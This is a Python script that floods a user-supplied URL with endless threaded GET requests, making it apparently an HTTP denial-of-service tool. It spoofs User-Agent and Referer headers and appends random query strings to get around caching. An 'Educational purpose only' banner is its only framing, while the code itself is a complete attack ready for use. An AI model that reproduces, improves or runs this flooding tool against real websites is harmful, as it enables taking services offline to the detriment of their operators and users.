import os
import requests
import threading
import random
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

########################################
#       Educational purpose only       #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

url = input("URL:  ").strip()

if not url.startswith("http://") and not url.startswith("https://"):
    logging.error("Invalid URL. Please include http:// or https://")
    exit()

num_threads = int(input("Number of threads: ").strip())
request_rate = float(input("Request rate (requests per second): ").strip())

headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
]

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers

def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)

    return out_str

def make_request():
    try:
        headers = {'User-Agent': random.choice(useragent()), 'Referer': random.choice(referer)}
        randomized_url = url + "?" + genstr(random.randint(3, 10))
        response = requests.get(randomized_url, headers=headers)
        if response.status_code == 200:
            logging.info(f"Request successful: {randomized_url}")
        else:
            logging.warning(f"Request failed with status code: {response.status_code}")
    except requests.exceptions.ConnectionError:
        logging.error("[Server might be down!]")
    except requests.exceptions.InvalidSchema:
        logging.error("[URL Error]")
        raise SystemExit()
    except ValueError:
        logging.error("[Check Your URL]")
        raise SystemExit()
    except KeyboardInterrupt:
        logging.info("[Canceled by User]")
        raise SystemExit()

def worker():
    while True:
        make_request()
        time.sleep(1 / request_rate)

def main():
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(worker) for _ in range(num_threads)]
        for future in as_completed(futures):
            if future.exception() is not None:
                logging.error("An error occurred in one of the threads", exc_info=future.exception())

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("[Canceled By User]")
        exit()
